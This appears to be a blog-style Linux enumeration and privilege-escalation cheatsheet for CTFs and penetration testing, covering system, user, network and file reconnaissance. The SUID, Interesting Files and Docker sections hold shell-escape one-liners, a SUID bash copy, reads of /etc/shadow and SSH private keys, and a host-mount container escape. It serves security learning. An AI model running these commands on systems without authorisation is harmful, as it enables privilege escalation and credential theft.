---
title: Linux Enumeration Cheatsheet
slug: linux-enum
date: 2026-08-16
updated: 2026-08-19
tags: [linux, enumeration, scanning, recon, Networking]
description: A comprehensive guide for enumerating Linux systems during CTFs and penetration testing.
---

# Linux Enumeration Cheatsheet

---

## Table of Contents
1. [System Information](#system-information)
2. [Users & Groups](#users--groups)
3. [Network](#network)
4. [Processes & Services](#processes--services)
5. [Files & Permissions](#files--permissions)
6. [Sudo & SUID](#sudo--suid)
7. [Cron Jobs](#cron-jobs)
8. [Installed Software](#installed-software)
9. [Kernel Exploits](#kernel-exploits)
10. [Interesting Files](#interesting-files)
11. [Container/Docker Escape](#containerdocker-escape)

---

## System Information

```bash
# Basic system info
uname -a                    # Kernel version, architecture
uname -r                    # Kernel release
cat /etc/os-release         # OS distribution and version
cat /etc/issue              # OS info (may be customized)
hostname                    # Hostname
hostname -I                 # IP addresses

# Hardware info
lscpu                       # CPU information
cat /proc/cpuinfo           # Detailed CPU info
free -h                     # Memory usage
df -h                       # Disk usage
lsblk                       # Block devices

# Environment
env                         # Environment variables
set                         # All shell variables
echo $PATH                  # PATH variable
echo $SHELL                 # Current shell
printenv                    # All environment variables
```

---

## Users & Groups

```bash
# Current user
whoami                      # Current username
id                          # Current user ID and groups
id <user>                   # Info about specific user

# User enumeration
cat /etc/passwd             # All users
cat /etc/shadow             # Password hashes (requires root)
getent passwd               # List all users
getent group                # List all groups

# Logged in users
who                         # Who is logged in
w                           # Who is doing what
last                        # Last logins
lastlog                     # Last login for all users

# Sudo privileges
sudo -l                     # List sudo privileges (check for NOPASSWD)
```

---

## Network

```bash
# Network interfaces
ip a                        # IP addresses
ifconfig                    # Legacy network info
ip route                    # Routing table
route -n                    # Routing table (legacy)

# Active connections
ss -tulpn                   # Listening sockets with processes
netstat -tulpn              # Legacy listening sockets
ss -tunap                   # All connections with processes
lsof -i                     # Network connections by process

# Firewall
iptables -L                 # Firewall rules
ufw status                  # UFW firewall status
firewall-cmd --state        # Firewalld status

# DNS
 cat /etc/resolv.conf        # DNS configuration
 cat /etc/hosts              # Host entries
 hostname -d                 # Domain name

# ARP table
ip neigh                    # ARP table
arp -a                      # ARP table (legacy)
```

---

## Processes & Services

```bash
# Process listing
ps aux                      # All processes
ps -ef                      # All processes (alternate format)
top                         # Interactive process viewer
htop                        # Better top (if installed)

# Process details
pgrep <name>                # Find PID by name
pstree                      # Process tree
cat /proc/<pid>/cmdline     # Command line of process
cat /proc/<pid>/environ     # Environment of process
cat /proc/<pid>/maps        # Memory map

# Services
systemctl list-units --type=service --state=running
service --status-all        # Legacy service status
initctl list                # Upstart services
chkconfig --list            # SysV services

# Scheduled tasks
crontab -l                  # Current user crons
cat /etc/crontab            # System crontab
ls -la /etc/cron.*          # Cron directories
ls -la /var/spool/cron/     # User cron files
```

---

## Files & Permissions

```bash
# Find SUID files
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Find SGID files
find / -perm -2000 -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# Find writable files
find / -writable -type f 2>/dev/null
find / -writable -type d 2>/dev/null

# Find files owned by user
find / -user <username> -type f 2>/dev/null
find / -group <groupname> -type f 2>/dev/null

# Find world-readable files
find / -perm -o=r -type f 2>/dev/null

# Find recently modified files
find / -mtime -1 -type f 2>/dev/null      # Modified in last day
find / -mmin -60 -type f 2>/dev/null      # Modified in last hour

# Find files with specific extensions
find / -name "*.txt" -o -name "*.log" -o -name "*.conf" 2>/dev/null
find / -name "*.bak" -o -name "*.old" -o -name "*.backup" 2>/dev/null

# Find empty files/directories
find / -empty -type f 2>/dev/null
find / -empty -type d 2>/dev/null

# Check ACLs
getfacl <file>                # Get file ACLs
getfacl -R /path              # Recursive ACLs
```

---

## Sudo & SUID

```bash
# Check sudo privileges
sudo -l

# Common SUID escalation vectors
# nmap
nmap --interactive
!sh

# vim
vim -c ':!/bin/sh'

# less
less /etc/passwd
!bash

# more
more /etc/passwd
!bash

# man
man man
!bash

# find
find . -exec /bin/sh \; -quit

# awk
awk 'BEGIN {system("/bin/sh")}'

# python
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# perl
perl -e 'exec "/bin/sh";'

# ruby
ruby -e 'exec "/bin/sh"'

# gdb
gdb -q -ex 'shell' -ex 'quit'

# cp, mv (overwrite sensitive files)
sudo cp /bin/bash /tmp/bash && sudo chmod +s /tmp/bash
```

---

## Cron Jobs

```bash
# List all cron jobs
crontab -l
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# Check cron logs
cat /var/log/cron
cat /var/log/syslog | grep CRON

# Writable cron scripts
find /etc/cron* -writable 2>/dev/null
```

---

## Installed Software

```bash
# Package managers
dpkg -l                     # Debian/Ubuntu packages
apt list --installed        # Installed packages
rpm -qa                     # RHEL/CentOS packages
yum list installed          # YUM packages
pacman -Q                   # Arch packages
apk list --installed        # Alpine packages

# Manual installations
ls /usr/local/bin/
ls /opt/
ls /usr/local/

# Check versions
<program> --version
<program> -v
which <program>
```

---

## Kernel Exploits

```bash
# Check kernel version
uname -r
uname -a
cat /proc/version

# Common exploit databases
# https://www.exploit-db.com/
# https://github.com/SecWiki/linux-kernel-exploits

# Search for local exploits
searchsploit linux kernel <version> local
searchsploit ubuntu <version> local

# Compile exploits on target
gcc exploit.c -o exploit
./exploit
```

---

## Interesting Files

```bash
# Password files
cat /etc/passwd
cat /etc/shadow
cat /etc/group
cat /etc/gshadow

# SSH keys
find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
find / -name "known_hosts" 2>/dev/null
cat ~/.ssh/id_rsa
cat ~/.ssh/authorized_keys

# Configuration files
cat /etc/ssh/sshd_config
cat /etc/apache2/apache2.conf
cat /etc/nginx/nginx.conf
cat /etc/mysql/my.cnf
cat /etc/redis/redis.conf

# Application configs
find / -name "*.conf" -o -name "*.config" 2>/dev/null
find / -name ".env" 2>/dev/null
find / -name "config.php" 2>/dev/null
find / -name "database.yml" 2>/dev/null

# Logs
cat /var/log/auth.log
cat /var/log/syslog
cat /var/log/apache2/access.log
cat /var/log/nginx/access.log
cat /var/log/apache2/error.log

# History files
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.mysql_history
cat ~/.python_history
find / -name ".bash_history" 2>/dev/null

# Backup files
find / -name "*.bak" -o -name "*.backup" -o -name "*.old" -o -name "*.swp" -o -name "*~" 2>/dev/null

# Database files
find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null
```

---

## Container/Docker Escape

```bash
# Check if inside container
ls -la /.dockerenv
cat /proc/1/cgroup | grep docker
mount | grep cgroup

# Check capabilities
capsh --print

# Docker socket access
ls -la /var/run/docker.sock

# If docker socket is accessible
docker ps
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Privileged container escape
fdisk -l                    # Check if host devices visible
mount /dev/sda1 /mnt        # Mount host filesystem

# Check for dangerous capabilities
cat /proc/self/status | grep Cap
```

---

## 🔧 One-Liners

```bash
# Quick system overview
(echo "=== SYSTEM ==="; uname -a; echo "=== USERS ==="; cat /etc/passwd; echo "=== SUDO ==="; sudo -l; echo "=== SUID ==="; find / -perm -4000 -type f 2>/dev/null) | less

# Find all potential privesc vectors
(find / -perm -4000 -type f 2>/dev/null; sudo -l; crontab -l; cat /etc/crontab) 2>/dev/null

# Network recon quick
(ip a; ip route; ss -tulpn; cat /etc/resolv.conf) 2>/dev/null
```

---
